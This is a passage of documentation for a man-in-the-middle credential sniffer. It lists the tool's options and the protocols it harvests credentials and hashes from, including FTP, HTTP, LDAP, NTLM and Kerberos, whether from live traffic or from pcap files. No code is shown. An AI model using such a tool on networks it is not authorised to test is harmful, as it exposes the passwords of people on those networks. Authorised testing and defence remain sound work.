| `-I` / `--interface` | Live capture interface (required unless `--pcap-file` or `--pcap-dir`) |
| `--ignore` | Skip packets from/to this IP |
| `--pcap-file` | Parse one `.pcap` file |
| `--pcap-dir` | Recursively parse all `.pcap` files in a directory |
| `--output-dir` | Write deduplicated per-protocol `.txt` files |

### Behavior

- Live mode: AF_PACKET sniff on IPv4; Ctrl+C to stop
- Parses FTP USER/PASS, SMTP AUTH, IRC nick/pass, HTTP Basic/forms, LDAP bind, MSSQL TDS, NTLM (HTTP + raw), Kerberos AS-REQ, SNMP v1/v2c communities
- With `--output-dir`, appends unique hits to files such as `FTP-Plaintext.txt`, `HTTP-Basic.txt`, `NTLMv2.txt`

### Output colors

| Element | Color | Meaning |
|---------|-------|---------|
| `[CRED]` | Cyan | Tag prefix |
| Credential payload | Yellow | Extracted secret line |

### Requirements

- Live capture: Linux with root or `CAP_NET_RAW`
- Pcap modes: readable `.pcap` input (no interface required)

Implementation: `libs/mitm/credsniff/`
